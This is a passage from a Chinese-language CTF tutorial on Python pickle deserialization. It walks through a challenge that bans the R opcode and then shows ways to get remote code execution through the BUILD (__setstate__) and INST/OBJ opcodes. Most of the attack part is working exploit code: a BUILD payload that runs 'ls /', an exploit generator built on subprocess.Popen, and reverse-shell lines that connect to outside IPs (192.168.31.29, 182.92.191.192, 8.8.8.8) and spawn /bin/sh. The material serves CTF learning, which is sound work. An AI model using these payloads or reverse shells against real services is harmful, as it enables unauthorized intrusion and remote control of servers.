</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;R&#39;</span> <span style=color:#f92672>in</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>pickle_data</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;No... I don</span><span style=color:#8045ff>\&#39;</span><span style=color:#d88200>t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>                <span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#111>restricted_loads</span><span style=color:#111>(</span><span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64decode</span><span style=color:#111>(</span><span style=color:#111>pickle_data</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>if</span> <span style=color:#111>type</span><span style=color:#111>(</span><span style=color:#111>result</span><span style=color:#111>)</span> <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#111>Animal</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#39;Are you sure that is an animal???&#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#111>correct</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#111>result</span> <span style=color:#f92672>==</span> <span style=color:#111>Animal</span><span style=color:#111>(</span><span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>category</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;unpickle_result.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>result</span><span style=color:#f92672>=</span><span style=color:#111>result</span><span style=color:#111>,</span> <span style=color:#111>pickle_data</span><span style=color:#f92672>=</span><span style=color:#111>pickle_data</span><span style=color:#111>,</span> <span style=color:#111>giveflag</span><span style=color:#f92672>=</span><span style=color:#111>correct</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>except</span> <span style=color:#75af00>Exception</span> <span style=color:#00a8c8>as</span> <span style=color:#111>e</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>repr</span><span style=color:#111>(</span><span style=color:#111>e</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;Something wrong&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>sample_obj</span> <span style=color:#f92672>=</span> <span style=color:#111>Animal</span><span style=color:#111>(</span><span style=color:#d88200>&#39;一给我哩giaogiao&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Giao&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>pickle_data</span> <span style=color:#f92672>=</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>sample_obj</span><span style=color:#111>))</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;unpickle_page.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>sample_obj</span><span style=color:#f92672>=</span><span style=color:#111>sample_obj</span><span style=color:#111>,</span> <span style=color:#111>pickle_data</span><span style=color:#f92672>=</span><span style=color:#111>pickle_data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>host</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#111>port</span><span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>看源码，opcode部分ban掉了<code>R</code>操作码（调用一个callable对象），不能用<code>__reduce__</code>了；也重写了<code>find_class()</code>，module必须是<code>__main__</code>；我们的目标是</p><p><code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)</code>为真，即correct==True</p><p>这里我们通过加载<code>__main__.secret</code>可以引入secret模块，来把<code>secret.name</code>和<code>secret.category</code>这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）</p><p>pker</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>secret</span> <span style=color:#f92672>=</span> <span style=color:#111>GLOBAL</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;secret&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;frieggs&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>secret</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;frieggs&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>animal</span> <span style=color:#f92672>=</span> <span style=color:#111>INST</span><span style=color:#111>(</span><span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;Animal&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;frieggs&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;frieggs&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>return</span> <span style=color:#111>animal</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#34;c__main__\nsecret\np0\n0g0\n(}(S&#39;name&#39;\nS&#39;frieggs&#39;\ndtbg0\n(}(S&#39;category&#39;\nS&#39;frieggs&#39;\ndtb(S&#39;frieggs&#39;\nS&#39;frieggs&#39;\ni__main__\nAnimal\np3\n0g3\n.&#34;</span>
</span></span></code></pre></div><p>或者构造的exp.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>Animal</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>,</span> <span style=color:#111>category</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>name</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>=</span> <span style=color:#111>category</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__repr__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;Animal(name=</span><span style=color:#d88200>{</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span><span style=color:#d88200>!r}</span><span style=color:#d88200>, category=</span><span style=color:#d88200>{</span><span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span><span style=color:#d88200>!r}</span><span style=color:#d88200>)&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__eq__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>other</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>type</span><span style=color:#111>(</span><span style=color:#111>other</span><span style=color:#111>)</span> <span style=color:#f92672>is</span> <span style=color:#111>Animal</span> <span style=color:#f92672>and</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>==</span> <span style=color:#111>other</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>and</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>category</span> <span style=color:#f92672>==</span> <span style=color:#111>other</span><span style=color:#f92672>.</span><span style=color:#111>category</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>dumps</span><span style=color:#111>(</span><span style=color:#111>Animal</span><span style=color:#111>(</span><span style=color:#111>name</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;x&#34;</span><span style=color:#111>,</span> <span style=color:#111>category</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;y&#34;</span><span style=color:#111>),</span> <span style=color:#111>protocol</span><span style=color:#f92672>=</span><span style=color:#ae81ff>3</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75715e># b&#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&#39;</span>
</span></span></code></pre></div><p>————所以在不允许<code>b'R'</code>的情况下，思路则是篡改secret中的name和categoriy，单纯的用<code>b'c'</code>引入模块对Animal进行实例化，这一过程也相当于是执行了函数</p></details><p>一种解决办法就是这个栗子中的，干脆就不rce，而是用<code>b'c'</code>变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。</p><h3 id=--使用__setstate__bb实现rce>&ndash;&#187;使用<code>__setstate__</code>&<code>b'b'</code>实现rce</h3><p>另一种方式是用BUILD指令<code>b'b'</code>及进行rce。</p><p>在pickle源码中BUILD指令是这样的</p><p><img src=https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg alt=img></p><p>如果一个实例inst拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则直接把<code>state</code>这个<code>dist</code>的内容合并到<code>inst.__dict__ </code>内。</p><p>如果一个类原本没有<code>__setstate__</code>这个方法，当我们用<code>{'__setstate__': os.system}</code>来BUILD这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>"ls /"</code>来再次BUILD这个对象，则会执行<code>setstate("ls /")</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了rce</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>os</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>class</span> <span style=color:#75af00>Student</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>def</span> <span style=color:#111>__init__</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;amelia&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>grade</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;A1&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\x80\x03</span><span style=color:#d88200>c__main__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>Student</span><span style=color:#8045ff>\n</span><span style=color:#d88200>)</span><span style=color:#8045ff>\x81</span><span style=color:#d88200>}(V__setstate__</span><span style=color:#8045ff>\n</span><span style=color:#d88200>cos</span><span style=color:#8045ff>\n</span><span style=color:#d88200>system</span><span style=color:#8045ff>\n</span><span style=color:#d88200>ubVls /</span><span style=color:#8045ff>\n</span><span style=color:#d88200>b.&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># shell = b&#34;&#34;&#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.31.29/8426 0&gt;&amp;1&#34;&#39;\nb.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span><span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png alt=image-20210810025215320></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png alt=image-20210810025143114></p><p>可以看到成功做到了rce~~反弹shell当然也可以</p><h3 id=--使用_instantiateload_objload_instbobi实现rce>&ndash;&#187;使用<code>_instantiate()</code>&<code>load_obj()</code>&<code>load_inst()</code>&<code>b'o'</code>&<code>b'i'</code>实现rce</h3><ul><li><p><code>_instantiate()</code>: Create a new object via klass(*args); Leads to arbitrary function call actually</p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>_instantiate</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>,</span> <span style=color:#111>klass</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#111>args</span> <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> <span style=color:#111>isinstance</span><span style=color:#111>(</span><span style=color:#111>klass</span><span style=color:#111>,</span> <span style=color:#111>type</span><span style=color:#111>)</span> <span style=color:#f92672>or</span>
</span></span><span style=display:flex><span>        <span style=color:#111>hasattr</span><span style=color:#111>(</span><span style=color:#111>klass</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;__getinitargs__&#34;</span><span style=color:#111>)):</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># Arbitrary function all</span>
</span></span><span style=display:flex><span>            <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#111>klass</span><span style=color:#111>(</span><span style=color:#f92672>*</span><span style=color:#111>args</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>except</span> <span style=color:#75af00>TypeError</span> <span style=color:#00a8c8>as</span> <span style=color:#111>err</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>raise</span> <span style=color:#75af00>TypeError</span><span style=color:#111>(</span><span style=color:#d88200>&#34;in constructor for </span><span style=color:#d88200>%s</span><span style=color:#d88200>: </span><span style=color:#d88200>%s</span><span style=color:#d88200>&#34;</span> <span style=color:#f92672>%</span>
</span></span><span style=display:flex><span>                            <span style=color:#111>(</span><span style=color:#111>klass</span><span style=color:#f92672>.</span><span style=color:#111>__name__</span><span style=color:#111>,</span> <span style=color:#111>str</span><span style=color:#111>(</span><span style=color:#111>err</span><span style=color:#111>)),</span> <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>exc_info</span><span style=color:#111>()[</span><span style=color:#ae81ff>2</span><span style=color:#111>])</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#111>klass</span><span style=color:#f92672>.</span><span style=color:#111>__new__</span><span style=color:#111>(</span><span style=color:#111>klass</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#111>value</span><span style=color:#111>)</span>
</span></span></code></pre></div></li></ul></li><li><p><code>load_obj()</code></p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>load_obj</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Stack is ... markobject classobject arg1 arg2 ...</span>
</span></span><span style=display:flex><span>    <span style=color:#111>args</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>pop_mark</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#111>pop</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>_instantiate</span><span style=color:#111>(</span><span style=color:#111>cls</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dispatch</span><span style=color:#111>[</span><span style=color:#111>OBJ</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]]</span> <span style=color:#f92672>=</span> <span style=color:#111>load_obj</span>
</span></span></code></pre></div></li></ul></li><li><p><code>load_inst()</code></p><ul><li><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>load_inst</span><span style=color:#111>(</span><span style=color:#111>self</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># read from user input</span>
</span></span><span style=display:flex><span>    <span style=color:#111>module</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>readline</span><span style=color:#111>()[:</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ascii&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>readline</span><span style=color:#111>()[:</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span><span style=color:#f92672>.</span><span style=color:#111>decode</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ascii&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>klass</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>find_class</span><span style=color:#111>(</span><span style=color:#111>module</span><span style=color:#111>,</span> <span style=color:#111>name</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># get args from stack</span>
</span></span><span style=display:flex><span>    <span style=color:#111>args</span> <span style=color:#f92672>=</span> <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>pop_mark</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#111>self</span><span style=color:#f92672>.</span><span style=color:#111>_instantiate</span><span style=color:#111>(</span><span style=color:#111>klass</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>dispatch</span><span style=color:#111>[</span><span style=color:#111>INST</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]]</span> <span style=color:#f92672>=</span> <span style=color:#111>load_inst</span>
</span></span></code></pre></div></li></ul></li></ul><p>exp.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>pickle</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>struct</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>base64</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>exploit</span><span style=color:#111>(</span><span style=color:#111>command</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>assert</span> <span style=color:#111>type</span><span style=color:#111>(</span><span style=color:#111>command</span><span style=color:#111>)</span> <span style=color:#f92672>is</span> <span style=color:#111>list</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_prefix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;((&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_suffix</span> <span style=color:#f92672>=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;&#39;&#39;lisubprocess</span><span style=color:#8045ff>\n</span><span style=color:#d88200>Popen</span><span style=color:#8045ff>\n</span><span style=color:#d88200>.&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload_body</span> <span style=color:#f92672>=</span> <span style=color:#111>bytes</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>command</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>payload_body</span> <span style=color:#f92672>+=</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#34;X&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>bytes</span><span style=color:#111>(</span><span style=color:#111>struct</span><span style=color:#f92672>.</span><span style=color:#111>pack</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&lt;I&#34;</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>)))</span> <span style=color:#f92672>+</span> <span style=color:#111>bytes</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>,</span> <span style=color:#111>encoding</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;utf-8&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload_prefix</span> <span style=color:#f92672>+</span> <span style=color:#111>payload_body</span> <span style=color:#f92672>+</span> <span style=color:#111>payload_suffix</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>assert</span> <span style=color:#d88200>b</span><span style=color:#d88200>&#39;R&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> <span style=color:#111>payload</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>main</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>exploit</span><span style=color:#111>([</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;python&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;-c&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#d88200>&#34;print(&#39;pwned!&#39;)&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>])</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Payload:&#34;</span><span style=color:#111>,</span> <span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Length:&#34;</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Base64:&#34;</span><span style=color:#111>,</span> <span style=color:#111>base64</span><span style=color:#f92672>.</span><span style=color:#111>b64encode</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>x</span> <span style=color:#f92672>=</span> <span style=color:#111>pickle</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>x</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;__main__&#34;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>main</span><span style=color:#111>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># 反弹shell当然也可 都说了是rce了</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span><span style=color:#f92672>,</span><span style=color:#111>socket</span><span style=color:#f92672>,</span><span style=color:#111>os</span><span style=color:#f92672>,</span><span style=color:#111>pty</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>=</span><span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>socket</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>connect</span><span style=color:#111>((</span><span style=color:#d88200>&#34;182.92.191.192&#34;</span><span style=color:#111>,</span><span style=color:#ae81ff>50000</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>[</span><span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>dup2</span><span style=color:#111>(</span><span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>fileno</span><span style=color:#111>(),</span><span style=color:#111>fd</span><span style=color:#111>)</span> <span style=color:#00a8c8>for</span> <span style=color:#111>fd</span> <span style=color:#f92672>in</span> <span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>,</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span><span style=color:#ae81ff>2</span><span style=color:#111>)]</span>
</span></span><span style=display:flex><span><span style=color:#111>pty</span><span style=color:#f92672>.</span><span style=color:#111>spawn</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/bin/sh&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>exploit</span><span style=color:#111>([</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;python&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#34;-c&#34;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#d88200>&#39;import sys,socket,os,pty;s=socket.socket();s.connect((&#34;8.8.8.8&#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span><span style=color:#111>])</span>
